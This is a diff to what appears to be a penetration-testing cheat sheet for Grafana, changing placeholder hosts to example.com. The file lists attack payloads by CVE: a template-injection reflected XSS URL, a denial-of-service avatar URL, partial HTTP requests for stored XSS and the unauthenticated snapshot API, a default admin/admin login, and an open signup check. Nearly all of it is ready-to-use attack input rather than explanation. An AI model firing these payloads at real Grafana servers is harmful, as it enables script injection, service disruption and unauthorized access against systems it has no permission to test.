@@ -1,16 +1,16 @@
 # Grafana
 1. CVE-2021-41174 (Reflected XSS)
 ```
-<GRAFANA URL>/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
+https://example.com/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
 ```
 2. CVE-2020-13379 (Denial of Service)
 ```
-<GRAFANA URL>/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
+https://example.com/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
 ```
 3. CVE-2020-11110 (Stored XSS)
 ```
 POST /api/snapshots HTTP/1.1
-Host: <GRAFANA URL>
+Host: example.com
 Accept: application/json, text/plain, */*
 Accept-Language: en-US,en;q=0.5
 Referer: {{BaseURL}}
@@ -22,7 +22,7 @@ Connection: close
 4. CVE-2019-15043 (Grafana Unauthenticated API)
 ```
 POST /api/snapshots HTTP/1.1
-Host: <GRAFANA URL>
+Host: example.com
 Connection: close
 Content-Length: 235
 Accept: */*
@@ -37,5 +37,5 @@ Try to login using admin as username and password
 ```
 6. Signup Enabled
 ```
-<GRAFANA URL>/signup
+https://example.com/signup
 ```
